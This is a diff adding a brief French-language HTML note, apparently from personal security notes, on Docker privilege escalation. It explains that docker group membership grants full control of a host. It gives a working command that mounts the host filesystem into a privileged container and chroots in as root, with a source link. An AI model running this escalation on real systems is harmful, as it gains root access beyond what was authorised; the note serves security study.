@@ -1,0 +1,16 @@
+<h1 id="docker-privilege-escalation">Docker privilege escalation<a aria-hidden="true" class="anchor-heading icon-link" href="#docker-privilege-escalation"></a></h1>
+<h1 id="les-dangers-du-groupe-docker">Les dangers du groupe docker<a aria-hidden="true" class="anchor-heading icon-link" href="#les-dangers-du-groupe-docker"></a></h1>
+<p>Si un utilisateur a le groupe docker alors il a toutes les droits sur la machine.
+il peut utiliser un container du genre alpine ou ubuntu pour remonter le systeme en mode root </p>
+<pre class="language-bash"><code class="language-bash"><span class="token function">docker</span> run --rm -it -u root --privileged -v /:/mnt -v /var:/mnt/var -v /home/:/mnt/home ubuntu:22.04 <span class="token function">chroot</span> /mnt /bin/bash
+</code></pre>
+<hr>
+<p>Sources:</p>
+<ul>
+<li><a href="https://blog.creekorful.org/2020/08/docker-privilege-escalation/">https://blog.creekorful.org/2020/08/docker-privilege-escalation/</a></li>
+</ul>
+<hr>
+<h2 id="tags">Tags<a aria-hidden="true" class="anchor-heading icon-link" href="#tags"></a></h2>
+<ol>
+<li><a class="color-tag" style="--tag-color: #7ef4cc;" href="/notes/uifvl7ohh7j4eky6c44gxho">docker</a></li>
+</ol>
